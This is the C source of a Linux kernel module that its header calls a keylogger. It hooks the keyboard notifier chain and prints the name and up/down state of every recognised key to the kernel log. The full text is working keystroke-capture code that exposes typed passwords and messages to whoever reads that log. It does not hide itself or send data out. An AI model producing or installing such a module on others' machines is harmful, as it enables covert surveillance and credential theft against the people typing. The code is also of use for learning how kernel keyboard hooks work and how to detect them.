// keylogger kernel module
// Robert Peters 2009-07-08
///////////////////////////

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

#include "klmodule.h"

#define NUMBER_OF_KEYCODES sizeof(keycodes)/sizeof(char*)

static struct
notifier_block key_notifier =
{
  .notifier_call = key_callback
};

module_init(key_init);
module_exit(key_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert Peters");

int
key_init(void)
{
	printk(KERN_INFO "start klmodule\n");
  register_keyboard_notifier(&key_notifier);
	return 0;
}
 
void
key_exit(void)
{
	printk(KERN_INFO "stop klmodule\n");
  unregister_keyboard_notifier(&key_notifier);
}

static int
key_callback(struct notifier_block *self, unsigned long val, void *data)
{
  struct keyboard_notifier_param* key_event_state = data;

  bool key_pressure = key_event_state->down;
  unsigned int keycode = key_event_state->value;

  if (is_known_keycode(keycode))
    printk("key_callback: <%s> <%s>\n", keycode_to_key(keycode), key_level(key_pressure));

  return NOTIFY_DONE;
}

static char*
keycode_to_key(unsigned int keycode)
{
  if (is_known_keycode(keycode))
    return keycodes[keycode];
  
  return "UNKNOWN KEY";
}

static char*
key_level(bool key_pressure)
{
  if (key_pressure)
    return "PRESSED";

  return "RELEASED";
}

static bool
is_known_keycode(unsigned int keycode)
{
    return NUMBER_OF_KEYCODES > keycode;
}
